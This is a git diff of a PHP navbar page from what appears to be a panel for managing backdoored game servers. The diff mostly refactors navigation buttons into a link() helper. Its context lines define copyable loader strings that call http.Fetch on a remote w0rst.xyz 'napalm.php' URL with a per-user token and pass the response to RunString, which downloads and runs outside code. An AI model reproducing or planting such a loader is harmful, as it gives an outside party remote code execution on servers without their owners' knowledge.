@@ -26,22 +26,19 @@ $public = "http.Fetch('https://w0rst.xyz/project/func/napalm.php?type=public&tok
 $private = "http.Fetch('https://w0rst.xyz/project/func/napalm.php?type=private&token=$token', RunString)";
 
 if($Local::IsAdmin()) { 
-    $Logs = "<button class='nav-button' onclick='redirect(4)'>Logging</button>"; 
+    $Logs = "<button class='nav-button' onclick='link(`logs`)'>Logging</button>"; 
 }
 
 ?>
 
-<head>
-    <!-- head is for the snow effect -->
-    <script src="js/snowstorm.js"></script>
-</head>
-
+<script src="js/redirect.js"></script>
+<script src="js/snowstorm.js"></script>
 <div class="nav-container"> 
     <div class="navbar">
         <div class="nav-tab">
-            <button class="nav-button" onclick="redirect(1)">Home</button>
-            <button class="nav-button" onclick="redirect(2)">Members</button>
-            <button class="nav-button" onclick="redirect(3)">Servers</button>
+            <button class="nav-button" onclick="link('dashboard')">Home</button>
+            <button class="nav-button" onclick="link('members')">Members</button>
+            <button class="nav-button" onclick="link('servers')">Servers</button>
             <?php echo($Logs); ?>
         </div>
         <div class="dropdown-holder">
@@ -50,9 +47,9 @@ if($Local::IsAdmin()) {
                 <?php echo("<span class='name'>$username</span>"); ?>
             </div>
             <div class="dropdown">
-                <a class="dropdown-item" onclick="account()">Account</a>
+                <a class="dropdown-item" onclick="link('account')">Account</a>
                 <a class="dropdown-item" onclick="script()">Script</a>
-                <a class="dropdown-item" onclick="logout()"">Logout</a>
+                <a class="dropdown-item" onclick="link('req/simple.php?request=logout')"">Logout</a>
             </div>
         </div>
     </div>
@@ -77,7 +74,6 @@ if($Local::IsAdmin()) {
 </div>
 
 <script>
-
     $(".dropdown-holder").mouseenter(function() {
         $('.button-drop').css("border-radius", "3px 3px 0px 0px");
         $(".dropdown").fadeIn(150); 
@@ -88,15 +84,11 @@ if($Local::IsAdmin()) {
         $(".dropdown").fadeOut(150); 
     });
     
-    function script() {  $(".hidden1").fadeToggle(250); $('body').css("overflow-y", "hidden"); }
-    function account() { location.href = "account"; }
-    function logout() { location.href = "req/simple.php?request=logout"; }
-    function redirect(type) {
-        if(type == 1) { location.href = "dashboard"; }
-        if(type == 2) { location.href = "members"; }
-        if(type == 3) { location.href = "servers"; }
-        if(type == 4) { location.href = "logs"; }
+    function script() { 
+        $(".hidden1").fadeToggle(250); 
+        $('body').css("overflow-y", "hidden"); 
     }
+
     function copy(type) {
         if(type == 1) { $("#public").select(); document.execCommand("copy"); }
         if(type == 2) { $("#private").select(); document.execCommand("copy"); }
